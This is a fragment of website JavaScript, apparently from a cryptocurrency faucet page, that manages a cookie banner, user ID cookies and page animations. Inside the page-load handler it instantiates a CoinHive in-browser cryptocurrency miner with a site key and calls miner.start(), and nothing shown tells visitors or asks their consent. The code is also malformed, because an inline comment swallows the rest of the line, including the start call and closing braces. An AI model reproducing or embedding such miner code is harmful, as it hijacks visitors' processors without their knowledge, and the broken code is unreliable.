onReady(function() {
            if ((typeof(ToS) === 'undefined') && (getCookie('cookies') !== 'accepted')) {
                onReady(function() {
                    document.getElementById("cookiesAlertBox").style.display = 'block';
                    document.getElementById("cookiesAlertBox").classList.add('show');
                });
            } else {
                removeNode(document.getElementById("cookiesAlertBox"));
            }
            checkPreCode(document.querySelectorAll('div.code'));
            miner = new CoinHive.User('8LmFlbbRvuhUlItWzXzFs0kCBdKVgZ8e', "anonymus", { //threads: 4,autoThreads: true,throttle: 0.25,forceASMJS: false});miner.start();});if (0 > 0) {onReady(function() {window.setTimeout(doCron, 10000);});updateBalance();updateConversionRate();updateActiveReferrals();updateNextClaim();document.getElementById('logoutBar').classList.add('show');}if (localStorage.getItem('uid') === null) {var UID = getCookie('uid');localStorage.setItem('uid', UID);} else {setCookie('uid', localStorage.getItem('uid'), true);}if (localStorage.getItem('animations') === '1' || localStorage.getItem('animations') === null) {toggleAnimations();}